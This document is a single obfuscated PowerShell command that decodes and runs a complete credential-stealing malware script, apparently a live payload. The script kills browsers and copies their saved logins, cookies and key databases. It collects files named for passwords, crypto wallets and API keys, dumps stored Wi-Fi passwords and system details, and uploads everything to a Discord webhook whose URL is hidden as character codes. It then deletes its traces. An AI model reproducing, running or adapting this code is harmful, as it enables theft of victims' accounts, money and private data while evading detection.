[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("function kibr { ;     stop-process -name "*star*" -force -passthru -erroraction SilentlyContinue | Out-Null ;     stop-process -name "*yandex*" -force -passthru -erroraction SilentlyContinue | Out-Null ;     stop-process -name "*centbr*" -force -passthru -erroraction SilentlyContinue | Out-Null ;     stop-process -name "*sputnik*" -force -passthru -erroraction SilentlyContinue | Out-Null ;     stop-process -name "*cozmedi*" -force -passthru -erroraction SilentlyContinue | Out-Null ;     stop-process -name "*orbit*" -force -passthru -erroraction SilentlyContinue | Out-Null ;     stop-process -name "*amigo*" -force -passthru -erroraction SilentlyContinue | Out-Null ;     stop-process -name "*torch*" -force -passthru -erroraction SilentlyContinue | Out-Null ;     stop-process -name "*komate*" -force -passthru -erroraction SilentlyContinue | Out-Null ;     stop-process -name "*epic*" -force -passthru -erroraction SilentlyContinue | Out-Null ;     stop-process -name "*vivaldi*" -force -passthru -erroraction SilentlyContinue | Out-Null ;     stop-process -name "*brave*" -force -passthru -erroraction SilentlyContinue | Out-Null ;     stop-process -name "*chrom*" -force -passthru -erroraction SilentlyContinue | Out-Null ;     stop-process -name "*edge*" -force -passthru -erroraction SilentlyContinue | Out-Null ;     stop-process -name "*google*" -force -passthru -erroraction SilentlyContinue | Out-Null ;     stop-process -name "*iridium*" -force -passthru -erroraction SilentlyContinue | Out-Null ;     stop-process -name "*firefox*" -force -passthru -erroraction SilentlyContinue | Out-Null ;     stop-process -name "*waterfox*" -force -passthru -erroraction SilentlyContinue | Out-Null ;     stop-process -name "*thunder*" -force -passthru -erroraction SilentlyContinue | Out-Null ;     stop-process -name "*melon*" -force -passthru -erroraction SilentlyContinue | Out-Null ;     stop-process -name "*comod*" -force -passthru -erroraction SilentlyContinue | Out-Null ;     stop-process -name "*cyberf*" -force -passthru -erroraction SilentlyContinue | Out-Null ;     stop-process -name "*moon*" -force -passthru -erroraction SilentlyContinue | Out-Null ;     stop-process -name "*cent*" -force -passthru -erroraction SilentlyContinue | Out-Null ;     stop-process -name "*ched*" -force -passthru -erroraction SilentlyContinue | Out-Null ;     stop-process -name "*elem*" -force -passthru -erroraction SilentlyContinue | Out-Null ;     stop-process -name "*orbit*" -force -passthru -erroraction SilentlyContinue | Out-Null ;     stop-process -name "*360*" -force -passthru -erroraction SilentlyContinue | Out-Null ;     stop-process -name "*oper*" -force -passthru -erroraction SilentlyContinue | Out-Null ;     stop-process -name "*coow*" -force -passthru -erroraction SilentlyContinue | Out-Null ;     stop-process -name "*lieb*" -force -passthru -erroraction SilentlyContinue | Out-Null ;     stop-process -name "*surf*" -force -passthru -erroraction SilentlyContinue | Out-Null ;      ; } ; Function fold($path){ ;     if ($b.folderExists($path)){ ;         dir $path -recurse  | % { ;             $nm = $_.name ;             $fn = $_.FullName ;             if ($b.FileExists($fn)){ ;                 if ($nm -match "^(Cookies|Local State|Login Data|Web Data|History|Bookmarks|logins\.json|cookies\.sqlite|history\.sqlite|places\.sqlite|formhistory\.sqlite|storage\.sqlite|permissions\.sqlite|key4\.db)$") { ;                     $stn = $fn.replace(":","-").Replace("\","_").Replace(" ","_") ;                     $stln = "$spath\$stn.md" ;                     copy $fn $stln -Force ;                 } ;             } ;              ;         } ;     } ; } ; function brojack { ;     kibr ;     $bro = @("\Chromium\User Data", "\AVAST Software\Browser\User Data" , "\Amigo\User Data" , "\Torch\User Data" , "\Kometa\User Data" , "\Orbitum\User Data" , "\CentBrowser\User Data" , "\7Star\7Star\User Data" , "\Sputnik\Sputnik\User Data" , "\Vivaldi\User Data" , "\Google\Chrome SxS\User Data" , "\Google\Chrome\User Data" , "\Epic Privacy Browser\User Data" , "\Microsoft\Edge\User Data" , "\uCozMedia\Uran\User Data" , "\Yandex\YandexBrowser\User Data" , "\BraveSoftware\Brave-Browser\User Data" , "\Iridium\User Data" , "\Google\Chrome Beta" , "\Chedot" , "\Browser\CocCoc\" , "\Dragon\" , "\Comodo\" , "\Elements Browser\" , "\Uran\uCozMedia" , "\Opera Software\Opera Stable" , "\Opera Software\Opera GX Stable" , "\360Chrome\Chrome" , "\Yandex\YandexBrowser\" , "\sleipnir5\settings" , "\CatalinaGroup\Citrio" , "\Coowoo" , "\liebao" , "\Qip Surf" , "\360Browser\Browser" , "\Mozilla\Firefox" , "\Waterfox\" , "\K-Melon\" , "\Thunderbird\" , "\Comodo\IceDragon\" , "\8pecxstudios\Cyberfox\" , "\Waterfox\" , "\NETGATE Technologies\BlackHaw\" , "\Moonchild Productions\Pale Moon\" , "\Nichrome\" , "\Maxthon5\" , "\QIPSurf\" , "\TorBro\" , "\Suhba\" , "\Rafotech\")     ;     $bro | % { ;         $b1 = "$env:localappdata$_" ;         $b2 = "$env:appdata$_" ;          ;         if (test-path $b1){  fold($b1)  }  ;         if (test-path $b2){  fold($b2)  } ;     } ; } ; function rece { ;     $rce = "$env:????a??\Microsoft\Windows\Recent" ;     $fre = "" ;     dir $rce -Recurse -Filter *.lnk | % { ;         $fn = $_.fullname  ; $lnkz = $a.createshortcut($fn) ; $tar = $lnkz.targetpath ; 		if (!([string]::isnullorEmpty($tar))){ ; 			if ( test-path $tar) {  ;                 $par = Split-path $tar -parent 				 ;                 if ($fre -like "*$par*" -or $par -like "C:\" -or $par -like "C:\Window*" ){             ;                 } else { ;                     $fre += "-$par-" ;                     files($par) ;                 } ; 			}			 ; 			 ; 		} ;     } ;     files("$env:userprofile\Desktop") ;     files("$env:userprofile\Documents") ;     files("$env:userprofile\Downloads") ; } ; function files($path) { ;     if ($b.folderExists($path)){ ;         if ($path -ne "C:\" -or $path -notlike "C:\Window*"){ ;             dir $path -Recurse  | ? FullName -NotLike "*stl*"  | % { ;                 $fn = $_.FullName ;                 $nm = $_.Name ;                 if ($nm -match $int) { ;                     Write-Host "[+] $fn " -f green ;                     $stn = $fn.replace(":","-").Replace("\","_").Replace(" ","_") ;                     $fil = "$exf\$stn.txt" ;                     copy $fn $fil -Force ;                 } ;             } ;         } ;     } ; } ; function ip { ;     try { ;         $get = Invoke-WebRequest -UseBasicParsing -URI https://myip.dnsomatic.com/  ;         $ip = $get.Content ;     } catch { ;         $ip = curl checkip.amazonaws.com ;     } ;     return $ip     ; } ; function sys { ;     $OS = [System.Environment]::OSVersion.VersionString; ;      ;      ;     $sin = systeminfo ;     $av = Get-CimInstance -Namespace root/SecurityCenter2 -Classname AntivirusProduct  ;      ;      ;     $wi = netsh wlan show networks mode=bssid ;     $del = "`n************************************************************************************************************`n" ;     $dt = "$dmp\dt.json" ;      ;     $netp = PwNet ;     $p = ip ;     $del > $dt ;     $wi >> $dt ;     $del >> $dt ;     $netp >> $dt ;     $netp | Out-file $dt -force -Append ;     $del >> $dt ;     $av >> $dt ;     $del >> $dt ;     $qu >> $dt ;     $del >> $dt ;     $p >> $dt ;     $del >> $dt ;     $os >> $dt ;     $del >> $dt ;     $sin >> $dt ; } ; Function PwNet { ;      ;     $wln =@() ;     $ot = netsh.exe wlan show profiles | Select-String -pattern " : " ;     Foreach($wlnp in $ot){ ;         $wln += (($wlnp -split ":")[1]).Trim() ;     } ;     $wlno =@() ;      ;     Foreach($wlnp in $wln){ ;      ;         try{ ;             $wlnpp = (((netsh.exe wlan show profiles name="$wlnp" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim() ;         }Catch{ ;             $wlnpp = "The password is not stored in this profile" ;         } ;      ;         $wlnpo = New-Object PSCustomobject  ;         $wlnpo | Add-Member -Type NoteProperty -Name "ProfileName" -Value $wlnp ;         $wlnpo | Add-Member -Type NoteProperty -Name "ProfilePassword" -Value $wlnpp ;         $wlno += $wlnpo ;         Remove-Variable wlnpo ;     } ;     return $wlno ; } ;      ; function cfol($path){ ;     if (!($b.folderExists($path))){ ;         md $path | Out-Null ;     } ; } ; function snd { ;     dir $dmp -Exclude *.zip | % { ;         $fn = $_.FullName ;         $unm = $env:username ;         $r = "$fn-$unm.zip" ;         if ($b.folderExists($fn)){ try { Compress-Archive $fn $r -Force    } catch { $r = "$fn.zip" ; Compress-Archive $fn $r -Force } } else { $r = $fn } ;         upld($r) ;     } ; } ; Function ui ($f) { [byte[]]$o = $f.split('/') ; $ww = '' ; $o | % {  $s = [char]$_ ; $ww += $s } ; return $ww }  ; function upld($r) { ;     $u = ui("104/116/116/112/115/58/47/47/100/105/115/99/111/114/100/46/99/111/109/47/97/112/105/47/119/101/98/104/111/111/107/115/47/49/50/50/51/49/51/57/56/55/57/50/52/52/57/50/54/57/57/57/47/70/97/79/117/104/95/106/102/80/66/71/114/77/67/98/83/102/122/110/56/77/67/75/77/78/48/84/83/114/107/119/69/85/53/55/74/90/110/86/55/79/113/118/103/109/118/48/122/100/84/89/100/98/54/68/81/105/66/86/80/72/73/70/115/118/114/98/50") ;     if (test-path $r){  ;         if ($r -like "*.zip") { ;             $t = "ZIPD $r" ;         } else { ;             $t = [System.IO.File]::ReadAllText($r) ; ;         } ;         $b = @{'username' = $env:Username ; 'content' = $t}  ;          ;         $w.UploadFile($u,$r) | Out-Null   ;         Invoke-RestMethod -Method Post -ContentType 'application/json'  -Body ($b | ConvertTo-Json) -Uri $u -ErrorAction SilentlyContinue ;     } ; } ; $w = New-Object System.Net.WebClient ; $b = New-Object -ComObject Scripting.FileSystemObject ; $a = New-Object -ComObject Wscript.Shell ; $rn = Get-Random ; $int = "(pass|secre|backup|wallet|seed|btc|api|key|2fa|login|creden|auth|crypto|coin|poloniex|kraken|okex|binance|bitfinex|gdax|private|upbit|bcex|bithimb|hitbtc|bitflyer|kucoin|huobi|account|profile)\.(json|png|jpg|jpeg|webp|csv|txt|xlsx|log|doc|rtf|js|zip|ppt|php|html|py|cmd|bat|ps1|ts|vbs|wsf|rs|xls)" ; $m = $MyInvocation.MyCommand.Path ; $dmp = "$env:appdata\stl" ; $spath = "$dmp\br" ; $exf = "$dmp\xfi" ; cfol($dmp) ; cfol($spath) ; cfol($exf) ; rece ; sys ; brojack ; snd ; del $dmp -Recurse -Force ; $rn > $m ; "))|&($env:comspec[4,26,25]-join"")